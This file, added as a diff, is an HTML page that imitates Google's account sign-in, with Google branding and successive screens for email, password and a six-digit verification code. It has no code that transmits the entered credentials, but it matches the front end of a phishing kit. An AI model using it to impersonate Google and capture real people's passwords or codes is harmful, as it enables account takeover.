@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            padding: 40px 50px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 360px;
+            display: none;  /* Hide all screens initially */
+            animation: fadeIn 0.5s ease;
+        }
+        .active {
+            display: block;  /* Show only active screen */
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+        .logo img {
+            width: 75px;
+        }
+        h1, h2 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            color: #202124;
+            text-align: center;
+        }
+        p {
+            color: #5f6368;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 13px;
+            margin: 8px 0 20px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border: 2px solid #1a73e8;
+        }
+        a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .info-text {
+            font-size: 12px;
+            color: #5f6368;
+            margin: 20px 0;
+        }
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
+        }
+        .btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .btn:hover {
+            background-color: #1669c1;
+        }
+        .email-display {
+            font-size: 14px;
+            color: #202124;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        /* Verification Code Inputs */
+        .code-input {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0;
+        }
+        .code-input input {
+            width: 40px;
+            height: 50px;
+            font-size: 22px;
+            text-align: center;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+        .code-input input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 5px rgba(26, 115, 232, 0.5);
+        }
+        .resend {
+            margin-top: 15px;
+            font-size: 12px;
+            text-align: center;
+        }
+        .resend a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .resend a:hover {
+            text-decoration: underline;
+        }
+        .loading {
+            text-align: center;
+            margin-top: 20px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        @media (max-width: 400px) {
+            .container {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Email Screen -->
+    <div class="container active" id="email-screen">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+        </div>
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+
+        <form id="email-form">
+            <input type="text" id="email-input" placeholder="Email or phone" required>
+            <a href="#">Forgot email?</a>
+
+            <p class="info-text">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
+
+            <div class="actions">
+                <a href="#">Create account</a>
+                <button class="btn" type="submit">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- Password Screen -->
+    <div class="container" id="password-screen">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+        </div>
+        <h1>Welcome</h1>
+        <p class="email-display" id="display-email"></p>
+
+        <form id="password-form">
+            <input type="password" placeholder="Enter your password" required>
+            <a href="#">Forgot password?</a>
+
+            <div class="actions">
+                <a href="#" id="back-to-email">Back</a>
+                <button class="btn" type="submit">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- Verification Code Screen -->
+    <div class="container" id="verification-screen">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+        </div>
+        <h2>Verify it's you</h2>
+        <p>A 6-digit code was sent to <span id="verification-email"></span></p>
+
+        <form id="verification-form">
+            <div class="code-input">
+                <input type="text" maxlength="1" class="code" required>
+                <input type="text" maxlength="1" class="code" required>
+                <input type="text" maxlength="1" class="code" required>
+                <input type="text" maxlength="1" class="code" required>
+                <input type="text" maxlength="1" class="code" required>
+                <input type="text" maxlength="1" class="code" required>
+            </div>
+            <button class="btn" type="submit">Verify</button>
+        </form>
+
+        <p class="resend">Didn't get the code? <a href="#" id="resend-code">Resend</a></p>
+        <div class="loading" id="loading" style="display: none;">Verifying...</div>
+    </div>
+
+    <script>
+        const emailForm = document.getElementById('email-form');
+        const passwordForm = document.getElementById('password-form');
+        const verificationForm = document.getElementById('verification-form');
+
+        const emailScreen = document.getElementById('email-screen');
+        const passwordScreen = document.getElementById('password-screen');
+        const verificationScreen = document.getElementById('verification-screen');
+
+        const displayEmail = document.getElementById('display-email');
+        const verificationEmail = document.getElementById('verification-email');
+        const emailInput = document.getElementById('email-input');
+        const loadingIndicator = document.getElementById('loading');
+
+        // Switch from Email to Password Screen
+        emailForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = emailInput.value;
+            displayEmail.textContent = email;
+            verificationEmail.textContent = email;
+            emailScreen.classList.remove('active');
+            passwordScreen.classList.add('active');
+        });
+
+        // Back to Email Screen from Password
+        document.getElementById('back-to-email').addEventListener('click', function(event) {
+            event.preventDefault();
+            passwordScreen.classList.remove('active');
+            emailScreen.classList.add('active');
+        });
+
+        // Switch from Password to Verification Screen
+        passwordForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            passwordScreen.classList.remove('active');
+            verificationScreen.classList.add('active');
+        });
+
+        // Handle Verification Code Input Navigation
+        document.querySelectorAll('.code').forEach((input, index, inputs) => {
+            input.addEventListener('input', () => {
+                if (input.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Simulate Verification Process
+        verificationForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            loadingIndicator.style.display = 'block';  // Show loading indicator
+            
+            // Simulate a delay to mimic verification process
+            setTimeout(() => {
+                loadingIndicator.style.display = 'none';
+                alert('Verification successful!');  // Replace this with further navigation logic
+            }, 2000);
+        });
+
+        // Resend Code Logic (for realism)
+        document.getElementById('resend-code').addEventListener('click', function(event) {
+            event.preventDefault();
+            alert('A new verification code has been sent to ' + verificationEmail.textContent);
+        });
+    </script>
+
+</body>
+</html>
